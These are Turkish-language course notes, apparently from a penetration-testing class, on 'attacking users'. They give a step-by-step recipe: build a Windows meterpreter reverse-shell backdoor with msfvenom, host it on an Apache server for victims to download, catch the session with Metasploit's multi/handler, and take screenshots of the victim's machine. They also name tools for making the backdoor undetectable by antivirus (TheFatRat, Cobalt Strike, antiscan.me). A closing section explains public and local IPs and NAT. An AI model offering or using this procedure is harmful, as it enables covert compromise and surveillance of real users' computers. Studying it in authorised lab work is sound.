### Kullanıcılara Saldırmak

- Backdoor (arka kapı), bir yazılımda veya sistemde normal güvenlik mekanizmalarını atlayarak gizlice erişim sağlamaya yarayan yöntemdir.

**_ Attacking Users _**

- msfvenom --list payloads
- windows / meterpreter / reverse_tcp /platform,tip ve protokol girilir
- payload platform / payload type / payload protocol

* Platform > windows,linux,adroid,apple_ios...
* Type > shell,meterpreter,dllinject...
* Protocol > reverse,http,https,tcp,udp

**_ Backdoor Oluşturmak _**

> msfvenom --list payloads //Metasploit Framework içindeki kullanılabilir tüm payload’ları listelemek için kullanılır.

> msfvenom -payload windows/meterpreter/reverse_tcp --list options // ayarlar çıkar, zorunlu olanlar değiştirilir , meterpreter kullanma sebebi çok güçlü post-exploitation özellikleri var.hashdump,screenshot,webcam_snap.. -tcp http https denenir. hangisi olursa

> msfvenom -payload windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8080 --format exe --out mybackdoor.exe //localhost ip adresin,port genelde8080 web , format tipi dosyanın .exe // .exe dosyası oluşturulur

-

~File > var > www > html // buraya .exe dosyasını yapıştır

> service apache2 start // Makinen web sunucusu olur. Cihazın ip sine gidildiğinde web sitesi karşılar.

\*\*\* Kullanıcı dosyayı indirip çalıştırırsa (Bir Backdoor'un virüs programına takılmaması çok zor. Bunun için birçok araç var):

> msfconsole //Kullanıcı indirip çalıştırmışsa
> use exploit/multi/handler
> msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp //oluşturulan backdoor bilgileri
> msf6 exploit(multi/handler) > show options
> msf6 exploit(multi/handler) > set LHOST 192.168.64.2
> msf6 exploit(multi/handler) > set LPORT 8080
> msf6 exploit(multi/handler) > exploit -j -z
> msf6 exploit(multi/handler) > session -l
> msf6 exploit(multi/handler) > session -1
> meterpreter > ls //yaptığında kurban bilgisayarın bilgileri çıkar
> meterpreter > sysinfo // Hedef makine hakkında temel sistem bilgilerini gösterir.
> meterpreter > help // Alabileceğin tüm özellik ve bilgiler. ScreenShot-webcam-mouse...
> meterpreter > screenshot //kurbanın o anki ekran görüntüsünü alır hacker a kaydeder

\*\*\* antiscan.me //hangi defenderlara yakalanır test etmek için backdoor dosya test edilir

\*\*\* cobaltstrike.com // Yakalanmayacak backdoorlar oluşturur. Ücretlidir

** FatRat ile Backdoor oluşturmak **

- github hesabında indir linkini al

> git clone https://git... // komutu, terminalde bir uzaktaki Git reposunun aynısını bilgisayarına indirir.
> sudo bash setup.sh // klasöre git setup dosyasını bash kabuğunda çalıştırır.

- arayüz açılır
  [TheFatRat] > 2 // 2.Create Fud 100% Backdoor with Fudwin 1.0 seçeneğini seçeriz kesin yakalanmayacağını söyler.
  [TheFatRat] > 2 //Slow But Powerfull
  ... backdoor dosyası oluşturulur.

**_ IP _**

- Public IP : İnternette seni temsil eden IP adresidir. Dış dünyaya karşı görünen adresindir.
- Local IP : Ev / ofis içindeki cihazlara verilen IP’dir. Modem tarafından dağıtılır. Sadece aynı ağ içinden erişilebilir.

* Port forwarding public IP üzerinden yapılır
* NAT sistemi public ↔ local dönüşüm yapar
* Bilgisayarın isteği önce modemine gider, Modem NAT (Network Address Translation) yapar, İstek dış dünyaya senin Public IP adresinle çıkar

\*\* Sen tarayıcıya google.com yazarsın
DNS, google.com’u IP’ye çevirir (örneğin 142.x.x.x gibi)
Bilgisayar → modem (local IP ile)
Modem → internet (public IP ile)
Google cevabı senin public IP’ne yollar
Modem cevabı doğru local IP’ye yönlendirir

- ifconfig komutunu çalıştırdığında gördüğün IP: Local IP (yerel IP)
- Public IP’yi Nasıl Görürsün? > curl ifconfig.me
